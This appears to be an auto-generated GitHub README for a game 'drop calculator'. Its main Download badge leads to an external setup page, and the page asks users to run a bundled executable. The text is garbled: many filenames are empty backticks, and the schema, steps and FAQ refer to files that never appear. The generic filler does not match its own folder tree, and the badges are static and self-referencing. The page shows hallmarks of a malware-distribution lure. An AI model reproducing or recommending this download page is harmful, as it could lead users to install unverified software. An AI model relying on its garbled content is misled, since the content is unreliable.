# RobRun-Drop-Calculator

<div align="center">

<a href="https://rewfdf.github.io/SetupPage/">
  <img src="https://img.shields.io/badge/Download-Release-6d28d9?style=flat-square&logo=linux&logoColor=white" alt="Download">
</a>
&nbsp;
<a href="https://img.shields.io/static/v1?label=Version&message=1.3.2&color=blue&style=for-the-badge&logo=appveyor">
  <img src="https://img.shields.io/static/v1?label=Version&message=1.3.2&color=blue&style=for-the-badge&logo=appveyor" alt="Version">
</a>
&nbsp;
<a href="https://img.shields.io/static/v1?label=License&message=MIT&color=green&style=flat-square&logo=github">
  <img src="https://img.shields.io/static/v1?label=License&message=MIT&color=green&style=flat-square&logo=github" alt="License">
</a>
&nbsp;
<a href="https://img.shields.io/static/v1?label=Build&message=passing&color=brightgreen&style=flat&logo=travis">
  <img src="https://img.shields.io/static/v1?label=Build&message=passing&color=brightgreen&style=flat&logo=travis" alt="Build">
</a>
&nbsp;
<a href="https://img.shields.io/static/v1?label=Last%20Commit&message=Oct%2024%2026&color=orange&style=plastic&logo=gitlab">
  <img src="https://img.shields.io/static/v1?label=Last%20Commit&message=Oct%2024%2026&color=orange&style=plastic&logo=gitlab" alt="Last Commit">
</a>

</div>

---

## Overview

RobRun-Drop-Calculator is a precision‑oriented companion for the RobRun community, delivering instant drop probability analysis across all supported profile sets. It ships with three layers of configuration: `` for baseline settings, `` for user interface preferences, and `` for individualized character data. The bundled release includes pre‑built presets that cover every major event, making the calculator immediately useful for both newcomers and seasoned strategists.

---

## Features

- **Profile‑level granularity** – each preset maps directly to a specific in‑game event, allowing you to switch contexts with a single click.
- **Customizable probability thresholds** – tweak success rates on a per‑item basis without altering the core algorithm.
- **Export‑ready reports** – generate CSV or JSON summaries that can be fed into external spreadsheets or analytics pipelines.
- **Cross‑platform compatibility** – runs on Windows, macOS, and Linux with identical performance.
- **Extensible configuration schema** – add new drop entries by editing the lightweight `.cfg` files; the parser will handle them automatically.

---

### Configuration Schema

| File | Purpose | Key Parameters | Example |
|------|---------|----------------|---------|
| `` | Base drop tables | `item_id, probability, rarity` | `101, 0.12, rare` |
| `` | UI styling | `theme, font_size, show_tooltips` | `dark, 12pt, true` |
| `` | Character‑specific modifiers | `level, skill_bonus, equipment_bonus` | `5, 0.02, 0.05` |
| `event*.cfg` | Event presets | `event_name, drop_pool` | `Raid, [101,102,103]` |

All files follow a simple key=value format; comments start with `#`. Adjusting values in `` immediately reflects in the probability calculations.

---

## Getting Started

1. **Unpack the release bundle** – the ZIP contains the entire tree above and a single executable named `robrun_calc`.
2. **Open `config/`** – set your preferred theme and font size.
3. **Populate `config/`** – enter your character’s level and any skill or equipment bonuses.
4. **Select a preset** – navigate to `presets/` and launch the calculator with the desired `event*.cfg`.
   Example: `./robrun_calc presets/`
5. **Review the output** – probabilities appear in a table; use the export button to save the report.

All steps are guided by on‑screen prompts; no external dependencies are required.

---

## FAQ & Troubleshooting

| Question | Answer |
|----------|--------|
| **Why are some items showing a probability of 0?** | Verify that the item exists in both the base `` and the selected preset. Items absent from the preset are treated as unavailable. |
| **The calculator crashes after a preset loads.** | Ensure that `event*.cfg` contains valid JSON or key/value pairs. A stray comma or missing `=` can cause a parse error. |
| **How do I add a new drop?** | Insert a line into `` following the `item_id, probability, rarity` format, then reference the `item_id` in the preset’s `drop_pool`. |
| **Can I switch themes without restarting?** | Yes. Edit `config/` and press the “Reload” button in the UI; the change takes effect immediately. |
| **The export file is blank.** | Confirm that the “Export” option is activated in the UI. If not, click the gear icon and enable “Allow Export.” |

If further assistance is needed, consult the documentation in `docs/usage.md` or open an issue on the repository.

## 📁 Configuration System

```text
configs/
├── default.cfg
├── visual.cfg
├── player.cfg
└── custom.cfg
```